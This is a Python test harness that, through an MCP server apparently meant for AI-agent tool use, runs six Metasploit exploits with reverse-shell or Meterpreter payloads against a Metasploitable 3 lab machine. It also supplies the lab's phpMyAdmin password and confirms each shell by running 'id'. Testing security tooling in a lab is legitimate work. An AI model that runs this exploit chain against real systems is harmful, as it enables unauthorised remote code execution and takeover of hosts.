#!/usr/bin/env python3
"""
Metasploitable 3 Test Harness for MetasploitMCP

This harness tests the MetasploitMCP server against a real Metasploitable 3 target
by attempting various exploits from a documented walkthrough.

Usage:
    python metasploitable3_test_harness.py --target 10.0.2.15 --lhost 10.0.2.4 --lport 4444

Requirements:
    - MetasploitMCP server running (default: http://127.0.0.1:8085)
    - Metasploit RPC running (msfrpcd)
    - Metasploitable 3 (Linux) target accessible
"""

import argparse
import asyncio
import json
import logging
import re
import sys
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

from langchain_mcp_adapters.client import MultiServerMCPClient

# --- Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("metasploitable3_harness")


@dataclass
class ExploitTest:
    """Represents a single exploit test case."""
    name: str
    description: str
    module: str
    payload: str
    options: Dict[str, Any]
    expected_user: Optional[str] = None
    notes: Optional[str] = None
    run_as_job: bool = False  # If True, run exploit as background job


@dataclass
class TestResult:
    """Results of a single exploit test."""
    test_name: str
    success: bool
    session_id: Optional[int] = None
    session_info: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    duration_seconds: float = 0.0


class MetasploitMCPClient:
    """MCP client for interacting with MetasploitMCP server using proper MCP SDK."""
    
    def __init__(self, mcp_url: str = "http://127.0.0.1:8085", use_gateway: bool = False):
        """Initialize real MCP client.
        
        Args:
            mcp_url: Base URL of the MetasploitMCP server or ExploitMCP gateway
            use_gateway: If True, assumes connecting to ExploitMCP gateway (prefixes tool names with metasploit_)
        """
        self.mcp_url = mcp_url.rstrip('/')
        self.use_gateway = use_gateway
        
        # Gateway prefixes tool names with "metasploit_"
        self.tool_prefix = "metasploit_" if use_gateway else ""
        
        # Create proper MCP client with MultiServerMCPClient
        # It expects a dict of server_name -> config
        tools_config = {
            "metasploit": {
                "url": self.mcp_url,
                "transport": "streamable_http"  # FastMCP uses streamable_http transport
            }
        }
        
        self.client = MultiServerMCPClient(tools_config)
        self._tools = None
        
        server_type = "ExploitMCP Gateway" if use_gateway else "MetasploitMCP Server"
        logger.info(f"Initialized real MCP client for {server_type}: {self.mcp_url}")
        logger.info(f"Tool prefix: '{self.tool_prefix}'")
    
    async def close(self):
        """Close the MCP client."""
        # MultiServerMCPClient cleanup handled automatically
        pass
    
    async def _ensure_tools_loaded(self):
        """Ensure tools are loaded from MCP server."""
        if self._tools is None:
            logger.debug("Loading tools from MCP server...")
            self._tools = await self.client.get_tools()
            logger.debug(f"Loaded {len(self._tools)} tools")
    
    async def call_tool(self, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """Call an MCP tool using the real MCP client.
        
        Args:
            tool_name: Name of the tool to call
            arguments: Tool arguments
            
        Returns:
            Tool response data
            
        Raises:
            Exception: If the tool call fails
        """
        # Apply tool prefix if using gateway
        actual_tool_name = f"{self.tool_prefix}{tool_name}"
        
        logger.debug(f"Calling tool: {tool_name} (actual: {actual_tool_name}) with args: {arguments}")
        
        try:
            # Ensure tools are loaded
            await self._ensure_tools_loaded()
            
            # Find the tool
            tool = None
            for t in self._tools:
                if t.name == actual_tool_name:
                    tool = t
                    break
            
            if not tool:
                available_tools = [t.name for t in self._tools]
                raise Exception(f"Tool '{actual_tool_name}' not found. Available: {available_tools[:5]}")
            
            logger.debug(f"Invoking tool via MCP client...")
            
            # Use the real MCP client to invoke the tool
            result = await tool.ainvoke(arguments)
            
            logger.debug(f"Tool response: {result[:200] if isinstance(result, str) else result}")
            
            return {"success": True, "data": result}
            
        except Exception as e:
            logger.error(f"Error calling tool {tool_name}: {e}", exc_info=True)
            raise
    
    async def list_exploits(self, search_term: str = "", platform_filter: str = "") -> str:
        """List available exploits."""
        return await self.call_tool("list_exploits", {
            "search_term": search_term,
            "platform_filter": platform_filter
        })
    
    async def run_exploit(
        self,
        module_name: str,
        options: Dict[str, Any],
        payload_name: str,
        run_as_job: bool = False
    ) -> Dict[str, Any]:
        """Run an exploit module.
        
        Args:
            module_name: Metasploit module path (e.g., "exploit/unix/ftp/proftpd_modcopy_exec")
            options: Module options (RHOSTS, RPORT, etc.)
            payload_name: Payload to use (e.g., "cmd/unix/reverse_perl")
            run_as_job: If True, run as background job; if False, run via console (default: False)
            
        Returns:
            Exploit execution result
        """
        return await self.call_tool("run_exploit", {
            "module_name": module_name,
            "options": options,
            "payload_name": payload_name,
            "run_as_job": run_as_job
        })
    
    async def list_sessions(self) -> Dict[str, Any]:
        """List active sessions."""
        return await self.call_tool("list_active_sessions", {})
    
    async def send_session_command(self, session_id: int, command: str) -> Dict[str, Any]:
        """Send a command to an active session.
        
        Args:
            session_id: Session ID to send command to
            command: Command to execute
            
        Returns:
            Command output
        """
        return await self.call_tool("send_session_command", {
            "session_id": session_id,
            "command": command
        })
    
    async def start_listener(
        self,
        payload_type: str,
        lhost: str,
        lport: int
    ) -> Dict[str, Any]:
        """Start a reverse handler/listener.
        
        Args:
            payload_type: Payload type (e.g., "windows/meterpreter/reverse_tcp")
            lhost: Local host to listen on
            lport: Local port to listen on
            
        Returns:
            Listener job information
        """
        return await self.call_tool("start_listener", {
            "payload_type": payload_type,
            "lhost": lhost,
            "lport": lport
        })
    
    async def terminate_session(self, session_id: int) -> Dict[str, Any]:
        """Terminate an active session.
        
        Args:
            session_id: Session ID to terminate
            
        Returns:
            Termination result
        """
        return await self.call_tool("terminate_session", {
            "session_id": session_id
        })


class Metasploitable3TestHarness:
    """Test harness for Metasploitable 3 exploits."""
    
    def __init__(
        self,
        target_ip: str,
        lhost: str,
        lport: int = 4444,
        mcp_url: str = "http://127.0.0.1:8085",
        use_gateway: bool = False
    ):
        """Initialize test harness.
        
        Args:
            target_ip: Target Metasploitable 3 IP address
            lhost: Local IP for reverse connections
            lport: Local port for reverse connections (default: 4444)
            mcp_url: MetasploitMCP server URL or ExploitMCP gateway URL
            use_gateway: If True, connect to ExploitMCP gateway (default: False)
        """
        self.target_ip = target_ip
        self.lhost = lhost
        self.lport = lport
        self.mcp_client = MetasploitMCPClient(mcp_url, use_gateway=use_gateway)
        self.results: List[TestResult] = []
        
        server_type = "ExploitMCP Gateway" if use_gateway else "MetasploitMCP Server"
        logger.info(f"Initialized test harness:")
        logger.info(f"  Target: {target_ip}")
        logger.info(f"  LHOST: {lhost}")
        logger.info(f"  LPORT: {lport}")
        logger.info(f"  Server Type: {server_type}")
        logger.info(f"  Server URL: {mcp_url}")
    
    async def cleanup_all_sessions(self, kill_handler_jobs: bool = True) -> int:
        """Kill all active Metasploit sessions to free up ports.
        Optionally also kills all handler jobs.
        
        Args:
            kill_handler_jobs: If True, also kill all handler jobs after terminating sessions (default: True)
        
        Returns:
            Number of sessions terminated
        """
        logger.info("Cleaning up all active sessions to free ports...")
        try:
            # Get list of active sessions
            sessions_result = await self.mcp_client.list_sessions()
            logger.debug(f"Session list result: {sessions_result}")
            
            # Handle different response structures
            sessions = None
            
            # Try to parse from MCP tool result
            if isinstance(sessions_result, dict):
                # Check if it's the direct data structure
                if "sessions" in sessions_result:
                    sessions = sessions_result.get("sessions", {})
                # Check if it's wrapped in 'data' field (from MCP tool response)
                elif "data" in sessions_result:
                    data = sessions_result.get("data")
                    if isinstance(data, str):
                        try:
                            # Parse JSON string
                            parsed_data = json.loads(data)
                            if isinstance(parsed_data, dict) and "sessions" in parsed_data:
                                sessions = parsed_data.get("sessions", {})
                        except json.JSONDecodeError:
                            logger.debug("Could not parse data as JSON")
                    elif isinstance(data, dict) and "sessions" in data:
                        sessions = data.get("sessions", {})
                # Check for status-based response
                elif sessions_result.get("status") != "success":
                    logger.warning(f"Failed to list sessions: {sessions_result.get('message', 'Unknown error')}")
                    logger.debug(f"Full response: {sessions_result}")
                    return 0
            
            if sessions is None:
                logger.warning(f"Could not find sessions in response structure: {sessions_result}")
                return 0
            
            if not sessions:
                logger.info("No active sessions to clean up")
                return 0
            
            logger.info(f"Found {len(sessions)} active session(s) to terminate")
            
            # Terminate each session
            terminated_count = 0
            for session_id in sessions.keys():
                try:
                    logger.info(f"Terminating session {session_id}...")
                    result = await self.mcp_client.terminate_session(int(session_id))
                    logger.debug(f"Terminate result for session {session_id}: {result}")
                    
                    # Parse the result - it might be wrapped in 'data' or 'content'
                    success = False
                    error_msg = "Unknown error"
                    
                    if isinstance(result, dict):
                        # Check direct status
                        if result.get("status") == "success":
                            success = True
                        # Check in data field (as dict)
                        elif "data" in result:
                            data = result.get("data")
                            if isinstance(data, str):
                                try:
                                    parsed_data = json.loads(data)
                                    success = parsed_data.get("status") == "success"
                                    error_msg = parsed_data.get("message", error_msg)
                                except json.JSONDecodeError:
                                    # If it's just text, check if it indicates success
                                    success = "success" in data.lower() or "terminated" in data.lower()
                                    error_msg = data
                            elif isinstance(data, dict):
                                success = data.get("status") == "success"
                                error_msg = data.get("message", error_msg)
                        # Check content field
                        elif "content" in result:
                            content = result.get("content")
                            if isinstance(content, list) and len(content) > 0:
                                first_content = content[0]
                                if isinstance(first_content, dict) and first_content.get("type") == "text":
                                    text = first_content.get("text", "")
                                    success = "success" in text.lower() or "terminated" in text.lower()
                                    error_msg = text
                        
                        if not success:
                            error_msg = result.get("message", error_msg) or str(result)
                    
                    if success:
                        logger.info(f"✓ Session {session_id} terminated successfully")
                        terminated_count += 1
                    else:
                        logger.warning(f"⚠ Failed to terminate session {session_id}: {error_msg}")
                except Exception as e:
                    logger.error(f"✗ Error terminating session {session_id}: {e}")
            
            logger.info(f"Session cleanup complete: {terminated_count}/{len(sessions)} terminated")
            
            # Kill all handler jobs if requested
            if kill_handler_jobs:
                try:
                    logger.info("Killing all handler jobs to release ports...")
                    handlers_result = await self.mcp_client.call_tool("kill_all_handler_jobs", {})
                    logger.debug(f"Handler kill result: {handlers_result}")
                    
                    if isinstance(handlers_result, dict):
                        handlers_killed = handlers_result.get("handlers_killed", 0)
                        if handlers_killed > 0:
                            logger.info(f"✓ Killed {handlers_killed} handler job(s)")
                        else:
                            logger.info("No handler jobs found to kill")
                    
                except Exception as handler_e:
                    logger.warning(f"Error killing handler jobs: {handler_e}")
            
            # Give Metasploit time to release ports
            if terminated_count > 0 or kill_handler_jobs:
                logger.info("Waiting 2 seconds for ports to be released...")
                await asyncio.sleep(2)
            
            return terminated_count
            
        except Exception as e:
            logger.error(f"Error during session cleanup: {e}")
            return 0
    
    def get_exploit_tests(self) -> List[ExploitTest]:
        """Define exploit tests based on Metasploitable 3 walkthrough."""
        return [
            ExploitTest(
                name="ProFTPD ModCopy Exec",
                description="ProFTPD 1.3.5 Mod_Copy Command Execution",
                module="exploit/unix/ftp/proftpd_modcopy_exec",
                payload="cmd/unix/reverse_perl",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "80",
                    "RPORT_FTP": "21",
                    "SITEPATH": "/var/www/html/",
                    "SSL": "false",
                    "TARGETURI": "/",
                    "TMPPATH": "/tmp",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="www-data",
                notes="FTP service exploit via mod_copy vulnerability",
                run_as_job=False  # Console mode (default) - change to True to test job mode
            ),
            ExploitTest(
                name="Apache Shellshock",
                description="Apache mod_cgi Bash Environment Variable Injection (Shellshock)",
                module="exploit/multi/http/apache_mod_cgi_bash_env_exec",
                payload="linux/x86/meterpreter/reverse_tcp",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "80",
                    "TARGETURI": "/cgi-bin/hello_world.sh",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="www-data",
                notes="Shellshock vulnerability in CGI scripts"
            ),
            ExploitTest(
                name="Drupal Drupageddon",
                description="Drupal HTTP Parameter Key/Value SQL Injection",
                module="exploit/multi/http/drupal_drupageddon",
                payload="php/meterpreter/reverse_tcp",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "80",
                    "TARGETURI": "/drupal/",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="www-data",
                notes="Drupal SQL injection leading to RCE"
            ),
            ExploitTest(
                name="phpMyAdmin preg_replace",
                description="phpMyAdmin Authenticated Remote Code Execution",
                module="exploit/multi/http/phpmyadmin_preg_replace",
                payload="php/meterpreter/reverse_tcp",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "80",
                    "TARGETURI": "/phpmyadmin/",
                    "USERNAME": "root",
                    "PASSWORD": "sploitme",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="www-data",
                notes="Requires authentication (root:sploitme)"
            ),
            ExploitTest(
                name="Ruby on Rails ActionPack",
                description="Ruby on Rails ActionPack Inline ERB Code Execution",
                module="exploit/multi/http/rails_actionpack_inline_exec",
                payload="ruby/shell_reverse_tcp",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "3500",
                    "TARGETURI": "/readme",
                    "TARGETPARAM": "os",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="chewbacca",
                notes="Rails vulnerability on port 3500"
            ),
            ExploitTest(
                name="UnrealIRCd Backdoor",
                description="UnrealIRCd 3.2.8.1 Backdoor Command Execution",
                module="exploit/unix/irc/unreal_ircd_3281_backdoor",
                payload="cmd/unix/reverse",
                options={
                    "RHOSTS": self.target_ip,
                    "RPORT": "6697",
                    "LHOST": self.lhost,
                    "LPORT": str(self.lport)
                },
                expected_user="boba_fett",
                notes="IRC service backdoor"
            ),
        ]
    
    async def run_single_test(self, test: ExploitTest) -> TestResult:
        """Run a single exploit test.
        
        Args:
            test: Exploit test to run
            
        Returns:
            Test result
        """
        logger.info(f"\n{'='*80}")
        logger.info(f"Testing: {test.name}")
        logger.info(f"Description: {test.description}")
        logger.info(f"Module: {test.module}")
        logger.info(f"Payload: {test.payload}")
        if test.notes:
            logger.info(f"Notes: {test.notes}")
        logger.info(f"{'='*80}")
        
        start_time = datetime.now()
        
        try:
            # Run the exploit
            logger.info(f"Executing exploit (run_as_job={test.run_as_job})...")
            result = await self.mcp_client.run_exploit(
                module_name=test.module,
                options=test.options,
                payload_name=test.payload,
                run_as_job=test.run_as_job
            )
            
            logger.info(f"Exploit execution result: {result}")
            
            # Check for session
            await asyncio.sleep(3)  # Give it time to establish session
            sessions_result = await self.mcp_client.list_sessions()
            logger.info(f"Active sessions: {sessions_result}")
            
            # Parse session info
            session_id = None
            session_info = None
            
            # Try to extract session ID from result
            result_data = result.get("data", "")
            
            # Try to parse as JSON first (MetasploitMCP returns structured JSON)
            try:
                if isinstance(result_data, str):
                    result_json = json.loads(result_data)
                else:
                    result_json = result_data
                
                # Check for sessions in the structured response
                if isinstance(result_json, dict):
                    if "sessions" in result_json and result_json["sessions"]:
                        # Get the first session ID
                        session_ids = list(result_json["sessions"].keys())
                        if session_ids:
                            session_id = int(session_ids[0])
                            logger.info(f"Detected session ID from JSON: {session_id}")
                    elif "session_id" in result_json:
                        session_id = int(result_json["session_id"])
                        logger.info(f"Detected session ID from JSON: {session_id}")
                    elif "session_id_detected" in result_json and result_json["session_id_detected"]:
                        session_id = int(result_json["session_id_detected"])
                        logger.info(f"Detected session ID from session_id_detected field: {session_id}")
            except (json.JSONDecodeError, ValueError, KeyError) as e:
                logger.debug(f"Could not parse result as JSON: {e}")
                # Fall back to regex parsing for text output
                if isinstance(result_data, str) and "session" in result_data.lower():
                    session_match = re.search(r'session[s]?\s+(\d+)', result_data, re.IGNORECASE)
                    if session_match:
                        session_id = int(session_match.group(1))
                        logger.info(f"Detected session ID from regex: {session_id}")
            
            # If no session was detected, check active sessions for matching exploit/payload
            if not session_id:
                logger.info("No session detected in exploit output, checking active sessions...")
                try:
                    # Parse sessions_result
                    sessions = None
                    if isinstance(sessions_result, dict):
                        if "sessions" in sessions_result:
                            sessions = sessions_result.get("sessions", {})
                        elif "data" in sessions_result:
                            data = sessions_result.get("data")
                            if isinstance(data, str):
                                try:
                                    parsed_data = json.loads(data)
                                    if isinstance(parsed_data, dict) and "sessions" in parsed_data:
                                        sessions = parsed_data.get("sessions", {})
                                except json.JSONDecodeError:
                                    pass
                            elif isinstance(data, dict) and "sessions" in data:
                                sessions = data.get("sessions", {})
                    
                    if sessions:
                        # Look for a session matching this test's exploit/payload
                        for sid, sinfo in sessions.items():
                            if isinstance(sinfo, dict):
                                via_exploit = sinfo.get("via_exploit", "").lower()
                                via_payload = sinfo.get("via_payload", "").lower()
                                test_module_lower = test.module.lower().replace("exploit/", "")
                                test_payload_lower = test.payload.lower().replace("payload/", "")
                                
                                # Match if the session was created by this test's exploit and payload
                                if test_module_lower in via_exploit and test_payload_lower in via_payload:
                                    session_id = int(sid)
                                    logger.info(f"✓ Found matching active session {session_id} created by {via_exploit} with {via_payload}")
                                    break
                except Exception as e:
                    logger.warning(f"Error checking active sessions: {e}")
            
            # Verify session
            if session_id:
                try:
                    # Try to get user info
                    cmd_result = await self.mcp_client.send_session_command(
                        session_id=session_id,
                        command="id"
                    )
                    logger.info(f"Session command result: {cmd_result}")
                    
                    session_info = {
                        "session_id": session_id,
                        "user_info": cmd_result.get("data", "")
                    }
                    
                    duration = (datetime.now() - start_time).total_seconds()
                    logger.info(f"✓ Test PASSED - Session established (ID: {session_id})")
                    
                    return TestResult(
                        test_name=test.name,
                        success=True,
                        session_id=session_id,
                        session_info=session_info,
                        duration_seconds=duration
                    )
                except Exception as e:
                    logger.warning(f"Session exists but couldn't verify: {e}")
            
            # No session but exploit ran
            duration = (datetime.now() - start_time).total_seconds()
            logger.warning(f"⚠ Test PARTIAL - Exploit ran but no session detected")
            
            return TestResult(
                test_name=test.name,
                success=False,
                error="No session established",
                duration_seconds=duration
            )
            
        except Exception as e:
            duration = (datetime.now() - start_time).total_seconds()
            logger.error(f"✗ Test FAILED - {str(e)}")
            
            return TestResult(
                test_name=test.name,
                success=False,
                error=str(e),
                duration_seconds=duration
            )
    
    async def run_all_tests(self, continue_on_failure: bool = True, skip_cleanup: bool = False) -> List[TestResult]:
        """Run all exploit tests.
        
        Args:
            continue_on_failure: Continue testing even if a test fails
            skip_cleanup: Skip cleanup of existing sessions before running tests
            
        Returns:
            List of test results
        """
        # Clean up any existing sessions first to free ports (unless disabled)
        if not skip_cleanup:
            await self.cleanup_all_sessions()
        
        tests = self.get_exploit_tests()
        logger.info(f"\n{'#'*80}")
        logger.info(f"Starting Metasploitable 3 Test Suite")
        logger.info(f"Total tests: {len(tests)}")
        logger.info(f"{'#'*80}\n")
        
        self.results = []
        
        for i, test in enumerate(tests, 1):
            logger.info(f"\nRunning test {i}/{len(tests)}: {test.name}")
            
            result = await self.run_single_test(test)
            self.results.append(result)
            
            if not result.success and not continue_on_failure:
                logger.error("Test failed and continue_on_failure=False, stopping.")
                break
            
            # Small delay between tests
            if i < len(tests):
                logger.info("Waiting 5 seconds before next test...")
                await asyncio.sleep(5)
        
        return self.results
    
    def print_summary(self):
        """Print test summary."""
        logger.info(f"\n{'#'*80}")
        logger.info("TEST SUMMARY")
        logger.info(f"{'#'*80}\n")
        
        passed = sum(1 for r in self.results if r.success)
        failed = len(self.results) - passed
        total_duration = sum(r.duration_seconds for r in self.results)
        
        logger.info(f"Total Tests: {len(self.results)}")
        logger.info(f"Passed: {passed} ✓")
        logger.info(f"Failed: {failed} ✗")
        logger.info(f"Success Rate: {(passed/len(self.results)*100):.1f}%")
        logger.info(f"Total Duration: {total_duration:.2f}s")
        logger.info("")
        
        # Detailed results
        logger.info("Detailed Results:")
        logger.info("-" * 80)
        
        for result in self.results:
            status = "✓ PASS" if result.success else "✗ FAIL"
            logger.info(f"{status} | {result.test_name} ({result.duration_seconds:.2f}s)")
            
            if result.success and result.session_id:
                logger.info(f"      Session ID: {result.session_id}")
                if result.session_info:
                    user_info = result.session_info.get("user_info", "")
                    if user_info:
                        logger.info(f"      User Info: {user_info[:100]}")
            elif result.error:
                logger.info(f"      Error: {result.error}")
        
        logger.info(f"\n{'#'*80}\n")
    
    async def cleanup(self):
        """Clean up resources."""
        await self.mcp_client.close()


async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Test MetasploitMCP against Metasploitable 3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage
  python metasploitable3_test_harness.py --target 10.0.2.15 --lhost 10.0.2.4
  
  # Custom port
  python metasploitable3_test_harness.py --target 192.168.1.100 --lhost 192.168.1.10 --lport 4444
  
  # Custom MCP server
  python metasploitable3_test_harness.py --target 10.0.2.15 --lhost 10.0.2.4 --mcp-url http://localhost:9000
  
  # Run single test
  python metasploitable3_test_harness.py --target 10.0.2.15 --lhost 10.0.2.4 --test "ProFTPD ModCopy Exec"
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target Metasploitable 3 IP address"
    )
    parser.add_argument(
        "--lhost",
        required=True,
        help="Local IP address for reverse connections"
    )
    parser.add_argument(
        "--lport",
        type=int,
        default=4444,
        help="Local port for reverse connections (default: 4444)"
    )
    parser.add_argument(
        "--mcp-url",
        default="http://127.0.0.1:8085",
        help="MetasploitMCP server or ExploitMCP gateway URL (default: http://127.0.0.1:8085)"
    )
    parser.add_argument(
        "--gateway",
        action="store_true",
        help="Connect to ExploitMCP gateway (prefixes tool names with metasploit_, default: direct connection)"
    )
    parser.add_argument(
        "--test",
        help="Run only a specific test by name"
    )
    parser.add_argument(
        "--list-tests",
        action="store_true",
        help="List available tests and exit"
    )
    parser.add_argument(
        "--stop-on-failure",
        action="store_true",
        help="Stop testing after first failure"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose debug logging"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Skip cleanup of existing sessions before running tests (default: cleanup enabled)"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Create harness
    harness = Metasploitable3TestHarness(
        target_ip=args.target,
        lhost=args.lhost,
        lport=args.lport,
        mcp_url=args.mcp_url,
        use_gateway=args.gateway
    )
    
    # List tests if requested
    if args.list_tests:
        tests = harness.get_exploit_tests()
        print("\nAvailable Tests:")
        print("=" * 80)
        for i, test in enumerate(tests, 1):
            print(f"{i}. {test.name}")
            print(f"   Description: {test.description}")
            print(f"   Module: {test.module}")
            print(f"   Payload: {test.payload}")
            if test.notes:
                print(f"   Notes: {test.notes}")
            print()
        return 0
    
    try:
        # Run tests
        if args.test:
            # Clean up any existing sessions first to free ports (unless disabled)
            if not args.no_cleanup:
                await harness.cleanup_all_sessions()
            
            # Run specific test
            tests = harness.get_exploit_tests()
            matching_tests = [t for t in tests if args.test.lower() in t.name.lower()]
            
            if not matching_tests:
                logger.error(f"No test found matching: {args.test}")
                logger.info("Available tests:")
                for test in tests:
                    logger.info(f"  - {test.name}")
                return 1
            
            logger.info(f"Running test: {matching_tests[0].name}")
            result = await harness.run_single_test(matching_tests[0])
            harness.results.append(result)
        else:
            # Run all tests
            await harness.run_all_tests(
                continue_on_failure=not args.stop_on_failure,
                skip_cleanup=args.no_cleanup
            )
        
        # Print summary
        harness.print_summary()
        
        # Return exit code based on results
        failed_count = sum(1 for r in harness.results if not r.success)
        return 1 if failed_count > 0 else 0
        
    except KeyboardInterrupt:
        logger.info("\n\nInterrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        return 1
    finally:
        await harness.cleanup()


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))

